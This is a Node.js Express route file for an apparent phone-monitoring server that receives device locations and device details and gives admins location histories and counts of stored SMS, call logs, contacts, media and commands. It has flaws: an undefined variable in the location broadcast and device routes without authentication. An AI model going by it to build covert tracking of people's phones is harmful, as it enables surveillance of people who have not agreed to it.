const express = require('express');
const fetch = require('node-fetch'); // if on node 18+ replace with global fetch
const { Op } = require('sequelize');
const { Device, Location, MediaFile, Contact, SMS, CallLog, DeviceInfo, Command } = require('../config/database');
const { authenticateToken, authenticateDevice, requireAdmin } = require('../middleware/auth');
const logger = require('../utils/logger');

const router = express.Router();

// Log all device requests
const logRequest = (req, res, next) => {
  const requestId = req.requestId || 'unknown';
  logger.info(`[${requestId}] Devices API: ${req.method} ${req.originalUrl}`);
  if (Object.keys(req.body || {}).length > 0) {
    logger.debug(`[${requestId}] Body:`, JSON.stringify(req.body, null, 2));
  }
  next();
};

router.use([
  express.json({ limit: '10mb' }),
  express.urlencoded({ extended: true, limit: '10mb' }),
  logRequest
]);

const debug = (...args) => console.log('[DEVICES]', ...args);
debug('Devices route loaded');

/* -----------------------------------------------------
 * NORMALIZE DEVICE OUTPUT
 * --------------------------------------------------- */
function normalizeDevice(plain) {
  if (!plain) return {};

  return {
    ...plain,

    deviceId: plain.deviceId,

    // 🔥 isOnline always wins — correct online status
    status: plain.isOnline ? 'online' : (plain.status || 'offline'),

    lastSeen: plain.lastSeen || plain.last_seen || null,
  };
}

/* -----------------------------------------------------
 * REVERSE GEOCODE (OSM + Google fallback)
 * --------------------------------------------------- */
async function reverseGeocode(lat, lng) {
  try {
    const provider = (process.env.GEOCODE_PROVIDER || 'nominatim').toLowerCase();

    if (provider === 'google' && process.env.GEOCODE_API_KEY) {
      const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${process.env.GEOCODE_API_KEY}`;
      const resp = await fetch(url);
      const data = await resp.json();

      if (data.status === 'OK' && data.results?.length > 0) {
        return data.results[0].formatted_address;
      }
      return null;
    }

    // Default: OpenStreetMap Nominatim
    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`;
    const resp = await fetch(url, {
      headers: {
        'User-Agent': process.env.REVERSE_GEOCODE_AGENT || 'HawkshawServer/1.0'
      },
      timeout: 8000
    });

    if (!resp.ok) return null;
    const data = await resp.json();
    return data.display_name || null;

  } catch (err) {
    logger.warn('Reverse geocode failed:', err.message);
    return null;
  }
}

/* -----------------------------------------------------
 * ADMIN — GET /api/devices
 * --------------------------------------------------- */
router.get('/', authenticateToken, requireAdmin, async (req, res) => {
  const requestId = req.requestId || 'unknown';

  try {
    logger.info(`[${requestId}] Fetching devices list`);
    const { page = 1, limit = 20, status, search } = req.query;
    const offset = (page - 1) * limit;

    logger.info(`[${requestId}] Fetching devices - Page: ${page}, Limit: ${limit}, Status: ${status || 'all'}, Search: ${search || 'none'}`);

    const whereClause = {};
    if (status) whereClause.status = status;

    if (search) {
      whereClause[Op.or] = [
        { device_name: { [Op.like]: `%${search}%` } },
        { device_id: { [Op.like]: `%${search}%` } },
        { model: { [Op.like]: `%${search}%` } },
        { manufacturer: { [Op.like]: `%${search}%` } }
      ];
    }

    const result = await Device.findAndCountAll({
      where: whereClause,
      limit: Number(limit),
      offset,
      order: [['lastSeen', 'DESC']],
      include: [{ model: DeviceInfo, as: 'deviceInfo' }]
    });

    res.json({
      success: true,
      data: result.rows.map(d => normalizeDevice(d.get({ plain: true }))),
      pagination: {
        current_page: Number(page),
        total_items: result.count,
        total_pages: Math.ceil(result.count / limit)
      }
    });

  } catch (error) {
    logger.error(`[${requestId}] Error fetching devices:`, error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/* -----------------------------------------------------
 * ADMIN — GET /api/devices/:deviceId
 * --------------------------------------------------- */
router.get('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  const requestId = req.requestId || 'unknown';

  try {
    const device = await Device.findByPk(req.params.deviceId, {
      include: [
        { model: DeviceInfo, as: 'deviceInfo' },
        { model: Location, as: 'locations', limit: 10, order: [['timestamp', 'DESC']] },
        { model: Command, as: 'commands', limit: 20, order: [['created_at', 'DESC']] }
      ]
    });

    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    res.json({ success: true, data: normalizeDevice(device.get({ plain: true })) });

  } catch (error) {
    logger.error(`[${requestId}] Fetch device failed:`, error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/* -----------------------------------------------------
 * DEVICE — POST LOCATION
 * --------------------------------------------------- */
router.post('/location', authenticateDevice, async (req, res) => {
  const requestId = req.requestId || 'unknown';

  try {
    const deviceId =
      req.body.deviceId ||
      req.body.device_id ||
      req.deviceId ||
      (req.device && req.device.deviceId);

    if (!deviceId) {
      return res.status(400).json({ success: false, error: 'Device ID missing' });
    }

    const {
      latitude,
      longitude,
      altitude,
      accuracy,
      speed,
      bearing,
      provider,
      address,
      battery_level,
      network_type,
      is_mock
    } = req.body;

    if (latitude == null || longitude == null) {
      return res.status(400).json({ success: false, error: 'Latitude & longitude required' });
    }

    let resolvedAddress =
      req.body.address || await reverseGeocode(latitude, longitude);

    // Save location
    await Location.create({
      deviceId,
      latitude,
      longitude,
      altitude,
      accuracy,
      speed,
      bearing,
      provider,
      address: resolvedAddress,
      timestamp: new Date(),
      battery_level,
      network_type,
      is_mock: !!is_mock
    });

    // 🔥 Mark device ONLINE
    await Device.update({
      isOnline: true,
      status: 'online',
      lastSeen: new Date()
    }, { where: { deviceId } });

    // Broadcast for admin live map
    if (req.io) {
      try {
        req.io.to('admin-room').emit('location-update', {
          deviceId,
          latitude,
          longitude,
          address: resolvedAddress,
          timestamp: location.timestamp || location.createdAt || new Date()
        });
      } catch (emitErr) {
        logger.warn(`[${requestId}] Emit failed for location-update:`, emitErr);
      }
    }

    res.json({ success: true });

  } catch (error) {
    logger.error(`[${requestId}] Location error:`, error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/* -----------------------------------------------------
 * ADMIN — LOCATION HISTORY (alias merged)
 * --------------------------------------------------- */
router.get(['/:deviceId/locations', '/:deviceId/location/history'],
  authenticateToken,
  requireAdmin,
  async (req, res) => {

    const requestId = req.requestId || 'unknown';

    try {
      const device = await Device.findByPk(req.params.deviceId);
      if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

      const { limit = 500, since } = req.query;

      const where = { deviceId: device.deviceId };
      if (since) where.timestamp = { [Op.gte]: new Date(since) };

      const locations = await Location.findAll({
        where,
        order: [['timestamp', 'DESC']],
        limit: Number(limit)
      });

      res.json({ success: true, data: locations });

    } catch (error) {
      logger.error(`[${requestId}] Location history error:`, error);
      res.status(500).json({ success: false, error: error.message });
    }
  }
);

// Update nickname
router.put('/:deviceId/nickname', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { nickname } = req.body;
    if (nickname !== undefined && typeof nickname !== 'string') return res.status(400).json({ success: false, error: 'Nickname must be a string' });

    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    await device.update({ nickname: nickname || null });
    logger.info(`Device nickname updated by admin: ${device.deviceId || device.device_id}`);

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    res.json({ success: true, message: 'Device nickname updated successfully', data: { device: normalizeDevice(devicePlain) } });
  } catch (error) {
    logger.error('Update device nickname error:', error);
    res.status(500).json({ success: false, error: 'Server error', message: error.message });
  }
});

// Delete device (Admin)
router.delete('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    await device.destroy();
    logger.info(`Device deleted by admin: ${device.deviceId || device.device_id}`);

    res.json({ success: true, message: 'Device deleted successfully' });
  } catch (error) {
    logger.error('Delete device error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Device stats endpoint
router.get('/:deviceId/stats', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const [
      locationCount,
      mediaCount,
      contactCount,
      smsCount,
      callLogCount,
      commandCount
    ] = await Promise.all([
      Location.count({ where: { deviceId: device.deviceId } }),
      MediaFile.count({ where: { device_id: device.id } }),
      Contact.count({ where: { device_id: device.id } }),
      SMS.count({ where: { device_id: device.id } }),
      CallLog.count({ where: { device_id: device.id } }),
      Command.count({ where: { device_id: device.id } })
    ]);

    const recentActivity = await Location.findAll({ where: { deviceId: device.deviceId }, limit: 5, order: [['timestamp', 'DESC']] });

    res.json({
      success: true,
      data: {
        statistics: {
          locations: locationCount,
          media_files: mediaCount,
          contacts: contactCount,
          sms_messages: smsCount,
          call_logs: callLogCount,
          commands: commandCount
        },
        recent_activity: recentActivity
      }
    });
  } catch (error) {
    logger.error('Get device stats error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Device info update (from device)
router.post('/info', async (req, res) => {
  try {
    const deviceIdHeader = req.body.device_id || req.body.deviceId || req.headers['x-device-id'];
    const device = await Device.findOne({ where: { deviceId: deviceIdHeader } });
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const {
      hardware_info,
      software_info,
      network_info,
      security_info,
      installed_apps,
      system_settings,
      permissions,
      sensors
    } = req.body;

    let deviceInfo = await DeviceInfo.findOne({ where: { device_id: device.id } });

    if (deviceInfo) {
      await deviceInfo.update({
        hardware_info, software_info, network_info, security_info,
        installed_apps, system_settings, permissions, sensors, last_updated: new Date()
      });
    } else {
      deviceInfo = await DeviceInfo.create({
        device_id: device.id, hardware_info, software_info, network_info, security_info,
        installed_apps, system_settings, permissions, sensors
      });
    }

    logger.info(`Device info updated: ${deviceIdHeader}`);

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    const emitted = { device_id: devicePlain.device_id || devicePlain.deviceId, deviceId: devicePlain.deviceId || devicePlain.device_id, info: deviceInfo.get ? deviceInfo.get({ plain: true }) : deviceInfo };

    if (req.io) {
      try { req.io.to('admin-room').emit('device-info-updated', emitted); } catch (emitErr) { logger.warn('Emit failed for device-info-updated', emitErr); }
    }

    res.json({ success: true, message: 'Device info updated successfully' });
  } catch (error) {
    logger.error('Update device info error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Set device offline (from device)
router.post('/offline', async (req, res) => {
  try {
    const deviceId =
      req.body.deviceId ||
      req.body.device_id ||
      req.headers['x-device-id'];

    if (!deviceId) {
      return res.status(400).json({ success: false, error: 'Missing deviceId' });
    }

    await Device.update({
      isOnline: false,
      status: 'offline',
      lastSeen: new Date()
    }, { where: { deviceId } });

    res.json({ success: true });

  } catch (error) {
    logger.error('Offline update error:', error);
    res.status(500).json({ success: false });
  }
});

module.exports = router;
